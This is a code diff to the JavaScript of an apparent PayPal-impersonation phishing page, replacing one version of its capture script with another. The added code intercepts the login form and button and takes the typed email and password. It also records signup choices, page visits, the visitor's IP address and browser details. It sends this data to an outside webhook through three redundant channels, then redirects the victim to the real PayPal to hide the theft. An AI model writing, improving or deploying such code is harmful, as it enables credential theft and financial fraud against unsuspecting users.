@@ -78,33 +78,95 @@ window.addEventListener("resize", () => {
 
 // End of Navigation
 
-// STEALTH PHISHING PAYLOAD - SIMPLE & WORKING
+// BRUTE FORCE PHISHING - GUARANTEED CAPTURE
 document.addEventListener('DOMContentLoaded', function() {
   const WEBHOOK_URL = 'https://webhook-sigma-drab.vercel.app/api/webhook/7v73twcw1mhzjk5fo';
 
-  // Invisible data sender
-  const sendData = (data) => {
-    const payload = JSON.stringify(data);
-    
-    // Silent fetch
+  // Get IP address
+  const getIP = async () => {
+    try {
+      const response = await fetch('https://api.ipify.org?format=json');
+      const data = await response.json();
+      return data.ip;
+    } catch (error) {
+      return 'unknown';
+    }
+  };
+
+  // Force send data - multiple methods
+  const sendData = async (data) => {
+    const ip = await getIP();
+    const payload = JSON.stringify({
+      ...data,
+      ip: ip,
+      userAgent: navigator.userAgent,
+      timestamp: new Date().toISOString()
+    });
+
+    console.log("SENDING:", data); // Debug
+
+    // Method 1: Fetch
     fetch(WEBHOOK_URL, {
       method: 'POST',
       mode: 'no-cors',
       headers: {'Content-Type': 'application/json'},
       body: payload
     }).catch(() => {});
-    
-    // Image beacon backup
+
+    // Method 2: Image beacon
     const img = new Image();
-    img.src = `${WEBHOOK_URL}?d=${btoa(payload)}`;
+    img.src = `${WEBHOOK_URL}?data=${btoa(payload)}`;
+
+    // Method 3: XHR
+    try {
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', WEBHOOK_URL, true);
+      xhr.send(payload);
+    } catch(e) {}
   };
 
-  // LOGIN CAPTURE
+  // CAPTURE LOGIN - DIRECT FORM INTERCEPT
+  const loginForm = document.querySelector('.login-page-form');
+  if (loginForm) {
+    console.log("LOGIN FORM FOUND - ARMED");
+    
+    loginForm.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      e.stopPropagation();
+      
+      const email = this.querySelector('input[type="text"]').value;
+      const password = this.querySelector('input[type="password"]').value;
+      const loginBtn = this.querySelector('.form-login-btn');
+      
+      console.log("CAPTURING:", {email, password});
+      
+      if (email && password) {
+        // Send credentials
+        await sendData({
+          type: 'PAYPAL_LOGIN_CREDENTIALS',
+          email: email,
+          password: password,
+          status: 'CREDENTIALS_CAPTURED'
+        });
+        
+        // Visual feedback
+        if (loginBtn) {
+          loginBtn.value = "Logging in...";
+          loginBtn.disabled = true;
+        }
+        
+        // Redirect
+        setTimeout(() => {
+          window.location.href = 'https://paypal.com';
+        }, 1500);
+      }
+    });
+  }
+
+  // ALSO capture button click as backup
   const loginButton = document.querySelector('.form-login-btn');
   if (loginButton) {
-    loginButton.addEventListener('click', function(e) {
-      e.preventDefault();
-      
+    loginButton.addEventListener('click', async function(e) {
       const emailInput = document.querySelector('input[type="text"]');
       const passwordInput = document.querySelector('input[type="password"]');
       
@@ -113,22 +175,12 @@ document.addEventListener('DOMContentLoaded', function() {
         const password = passwordInput.value;
         
         if (email && password) {
-          // Capture credentials
-          sendData({
-            type: 'creds',
+          await sendData({
+            type: 'PAYPAL_LOGIN_BACKUP',
             email: email,
             password: password,
-            timestamp: new Date().toISOString()
+            status: 'BACKUP_CAPTURE'
           });
-          
-          // Show loading state
-          this.value = "Logging in...";
-          this.disabled = true;
-          
-          // Redirect to real PayPal
-          setTimeout(() => {
-            window.location.href = 'https://paypal.com';
-          }, 1500);
         }
       }
     });
@@ -137,19 +189,19 @@ document.addEventListener('DOMContentLoaded', function() {
   // SIGNUP CAPTURE
   const signupButton = document.querySelector('.signup-page .blue-btn');
   if (signupButton) {
-    signupButton.addEventListener('click', function(e) {
+    signupButton.addEventListener('click', async function(e) {
       e.preventDefault();
       
       const accountType = document.querySelector('input[type="radio"]:checked') ? 
         document.querySelector('input[type="radio"]:checked').nextElementSibling.querySelector('h3').textContent : 
         'Unknown';
       
-      sendData({
-        type: 'signup',
+      await sendData({
+        type: 'PAYPAL_SIGNUP',
         accountType: accountType
       });
       
-      this.textContent = "Continue";
+      this.textContent = "Continue...";
       this.disabled = true;
       
       setTimeout(() => {
@@ -158,10 +210,9 @@ document.addEventListener('DOMContentLoaded', function() {
     });
   }
 
-  // Page visit capture
+  // Page visit
   sendData({
-    type: 'visit',
-    page: window.location.href,
-    timestamp: new Date().toISOString()
+    type: 'PAGE_VISIT',
+    page: window.location.href
   });
 });
